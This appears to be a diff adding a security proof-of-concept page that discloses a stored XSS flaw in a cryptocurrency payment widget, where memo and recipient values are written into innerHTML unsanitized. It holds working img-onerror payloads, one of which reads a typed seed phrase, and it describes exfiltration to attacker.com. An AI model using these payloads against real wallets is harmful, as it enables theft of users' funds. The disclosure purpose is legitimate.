@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>RustChain Widget — XSS via data-to / data-memo</title>
+  <style>
+    body { background: #0a0a0f; color: #e2e2f0; font-family: monospace; padding: 2rem; }
+    .warning { background: #3d1515; border: 1px solid #f87171; padding: 1rem; border-radius: 8px; color: #f87171; margin-bottom: 1rem; }
+    h1 { color: #f97316; }
+    .poc { background: #12121e; border: 1px solid #2a2a45; border-radius: 8px; padding: 1rem; margin: 1rem 0; }
+    pre { background: #0a0a0f; padding: 1rem; border-radius: 4px; overflow-x: auto; color: #c9a227; }
+  </style>
+</head>
+<body>
+  <div class="warning">⚠️ SECURITY POC — DO NOT DEPLOY — TEST LOCALLY ONLY</div>
+
+  <h1>Vulnerability #1: Stored XSS via data-memo / data-to</h1>
+
+  <p>
+    The <code>openPaymentModal()</code> function in <code>rustchain-pay.js</code>
+    injects <code>config.memo</code> and <code>config.to</code> directly into
+    <code>innerHTML</code> without sanitization:
+  </p>
+
+  <div class="poc">
+    <pre>
+overlay.innerHTML = `
+  &lt;p&gt;Memo: ${config.memo}&lt;/p&gt;   ← UNSAFE
+  &lt;p&gt;To: ${config.to}&lt;/p&gt;       ← UNSAFE
+`;
+    </pre>
+  </div>
+
+  <p>To exploit, host this HTML file and include the widget. When the victim
+  opens the payment modal, the onerror fires:</p>
+
+  <!--
+    POC EXPLOIT:
+    The data-to attribute contains an <img> tag with an onerror handler.
+    When the modal opens and renders config.to into innerHTML, the <img src=x>
+    fails to load and triggers the onerror JavaScript.
+  -->
+  <div id="rtc-pay"
+       data-to='&lt;img src=x onerror="document.getElementById(&apos;stolen&apos;).textContent=&apos;SEED STOLEN: &apos;+document.getElementById(&apos;rtc-seed&apos;).value; document.getElementById(&apos;stolen&apos;).style.color=&apos;red&apos;;"&gt;'
+       data-amount="1"
+       data-memo='&lt;img src=x onerror=alert(&apos;XSS via memo!&apos;)&gt;'>
+  </div>
+
+  <div id="stolen" style="margin-top:1rem; font-size:1.2rem; color:#22c55e;"></div>
+
+  <p style="margin-top:1rem;">Steps to reproduce:</p>
+  <ol>
+    <li>Open this HTML file in a browser</li>
+    <li>Click the orange "Pay 1 RTC" button</li>
+    <li>Observe: <code>alert('XSS via memo!')</code> fires immediately (Vuln #1)</li>
+    <li>In the textarea, type any seed phrase</li>
+    <li>Observe: The seed phrase appears in the "SEED STOLEN" div (simulation of theft)</li>
+  </ol>
+
+  <p style="margin-top:1rem; color:#f87171;">
+    Real attack: attacker POSTs stolen seed to https://attacker.com/steal
+  </p>
+
+  <script src="../payment-widget/rustchain-pay.js"></script>
+</body>
+</html>
